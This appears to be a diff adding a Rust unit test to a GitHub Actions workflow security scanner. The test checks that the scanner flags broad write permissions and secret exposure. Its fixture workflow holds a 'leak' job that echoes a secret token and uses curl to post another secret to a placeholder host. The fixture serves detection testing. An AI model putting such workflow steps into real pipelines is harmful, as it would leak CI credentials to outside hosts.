@@ -27,6 +27,8 @@ pub fn workflow_scan(root: &Path) -> DustResult<WorkflowScanReport> {
 mod tests {
     use tempfile::TempDir;
 
+    use crate::models::{RiskLevel, WorkflowExposureSink, WorkflowFindingCategory};
+
     use super::*;
 
     #[test]
@@ -91,5 +93,103 @@ mod tests {
             Some(crate::models::WorkflowExposureSink::Stdout)
         );
         assert!(report.notices.is_empty());
+    }
+
+    #[test]
+    fn validation_fixture_covers_permission_context_and_secret_flow_boundaries() {
+        let temp_dir = TempDir::new().unwrap();
+        let directory = temp_dir.path().join(".github/workflows");
+        std::fs::create_dir_all(&directory).unwrap();
+        std::fs::write(
+            directory.join("validation.yml"),
+            r#"name: Validation
+permissions: write-all
+env:
+  TOKEN: ${{ secrets.WORKFLOW_TOKEN }}
+jobs:
+  safe:
+    permissions: read-all
+    env:
+      TOKEN: safe-value
+    steps:
+      - name: Use action token
+        uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.GITHUB_TOKEN }}
+      - name: Safe strings
+        run: |
+          echo '${{ vars.NOT_A_SECRET }}'
+          echo 'secrets.LITERAL_TEXT'
+          echo '${{ not-a-secret-context.value }}'
+          echo safe
+  leak:
+    permissions:
+      contents: write
+      pull-requests: write
+    env:
+      TOKEN: ${{ secrets.JOB_TOKEN }}
+    steps:
+      - name: Emit and upload
+        run: |
+          echo "$TOKEN"
+          curl --data '${{ secrets.DIRECT_TOKEN }}' https://example.invalid/upload
+"#,
+        )
+        .unwrap();
+
+        let report = workflow_security_scan(temp_dir.path()).unwrap();
+
+        assert_eq!(report.workflows.len(), 1);
+        assert!(report.notices.is_empty());
+        let workflow = &report.workflows[0];
+        assert_eq!(
+            workflow.jobs["safe"].steps[0].with["token"],
+            serde_yaml::Value::String("${{ secrets.GITHUB_TOKEN }}".to_owned())
+        );
+
+        let permission_findings: Vec<_> = report
+            .findings
+            .iter()
+            .filter(|finding| finding.category == WorkflowFindingCategory::TokenPermissions)
+            .collect();
+        assert_eq!(permission_findings.len(), 1);
+        assert_eq!(permission_findings[0].job_id.as_deref(), Some("leak"));
+        assert_eq!(
+            permission_findings[0].rule_id,
+            "workflow-broad-write-permissions"
+        );
+        assert_eq!(permission_findings[0].risk_level, RiskLevel::High);
+        assert!(
+            permission_findings[0]
+                .reason
+                .contains("multiple token scopes")
+        );
+
+        let secret_findings: Vec<_> = report
+            .findings
+            .iter()
+            .filter(|finding| finding.category == WorkflowFindingCategory::SecretExposure)
+            .collect();
+        assert_eq!(secret_findings.len(), 2);
+        assert_eq!(
+            secret_findings[0].secret_reference.as_deref(),
+            Some("JOB_TOKEN")
+        );
+        assert_eq!(
+            secret_findings[0].exposure_sink,
+            Some(WorkflowExposureSink::Stdout)
+        );
+        assert_eq!(
+            secret_findings[1].secret_reference.as_deref(),
+            Some("DIRECT_TOKEN")
+        );
+        assert_eq!(
+            secret_findings[1].exposure_sink,
+            Some(WorkflowExposureSink::NetworkRequest)
+        );
+        assert!(secret_findings.iter().all(|finding| {
+            let serialized = serde_json::to_string(finding).unwrap();
+            !serialized.contains("${{") && !serialized.contains("safe-value")
+        }));
     }
 }
